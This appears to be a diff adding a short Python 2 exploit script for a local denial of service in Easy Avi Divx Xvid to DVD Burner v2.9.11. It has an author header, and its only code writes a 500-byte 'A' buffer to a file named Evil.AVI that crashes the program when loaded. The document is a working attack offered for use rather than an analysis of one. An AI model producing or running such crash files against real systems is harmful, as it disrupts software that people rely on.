@@ -1,0 +1,23 @@
+#!/usr/bin/python
+###########################################################################################
+# Exploit Title      : Easy Avi Divx Xvid to DVD Burner v2.9.11 - Local Denial of Service #
+# Exploit Author     : Hashim Jawad                                                       #
+# Twitter            : @ihack4falafel                                                     # 
+# Author Website     : ihack4falafel[.]com                                                #
+# Vendor Homepage    : http://www.divxtodvd.net/index.htm                                 #
+# Vulnerable Software: http://www.divxtodvd.net/easy_divx_to_dvd.exe                      #
+# Tested on OS       : Windows XP professional SP3                                        #
+#                      Windows 10 professional 64-bit                                     #
+# Steps to reproduce : Add Evil.AVI and BOOM!                                             #
+###########################################################################################
+
+buffer = "A" * 500
+
+try:
+	f=open("Evil.AVI","w")
+	print "[+] Creating %s bytes evil payload.." %len(buffer)
+	f.write(buffer)
+	f.close()
+	print "[+] File created!"
+except:
+	print "File cannot be created"
